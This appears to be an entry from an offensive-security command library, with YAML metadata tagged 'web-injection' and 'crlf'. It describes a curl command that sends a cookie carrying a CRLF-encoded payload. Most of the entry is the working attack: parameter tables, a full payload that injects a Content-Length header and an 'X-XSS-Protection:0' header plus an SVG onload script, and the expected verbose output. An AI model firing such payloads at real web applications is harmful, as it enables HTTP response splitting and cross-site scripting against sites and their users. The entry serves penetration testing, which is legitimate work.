---
type: command
executor: bash
data: 'curl -v -H "Cookie: $_COOKIE_NAME=$payload" $_TARGET_URL'
output: null
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - web-injection
  - crlf
verified: true
validated: true
---

# curl-send-crlf-cookie

## Command

```bash
curl -v -H "Cookie: $_COOKIE_NAME=$_PAYLOAD" $_TARGET_URL
```

## Description

This command uses curl to send an HTTP request with a malicious cookie containing CRLF sequences for response splitting and XSS injection. The verbose (-v) flag displays full request/response details, useful for verifying header injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_COOKIE_NAME | Name of the reflected cookie (e.g., session or user) | Yes |
| $_PAYLOAD | URL-encoded CRLF payload for injection (e.g., %0d%0aContent-Length:35...) | Yes |
| $_TARGET_URL | Vulnerable endpoint URL (e.g., http://target.com/page) | Yes |
| -v | Verbose output to show headers | No |
| -H | Custom header flag for Cookie | Built-in |

## Examples

### Basic Usage

```bash
curl -v -H "Cookie: reflected_cookie=test" http://example.com/
```

### Advanced Usage (with Payload)

```bash
curl -v -H "Cookie: reflected_cookie=%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0" http://target.com/vulnerable
```

## Expected Output

Successful execution shows verbose exchange:

* Response headers with injected Content-Length:35 and X-XSS-Protection:0
* Body starting with "23" followed by the SVG XSS payload
* In browser: alert('example.com') if rendered

Example snippet:

< HTTP/1.1 200 OK
< Content-Type: text/html
< Link: <https://example.com/>%0d%0aContent-Length:35%0d%0a...
<
< 23
< <svg onload=alert(document.domain)>
< 0

## Related

- [[procedures/CRLF-Cookie-Injection-for-XSS-Bypass]]
- [[codes/CRLF-Encoded-XSS-Payload]]
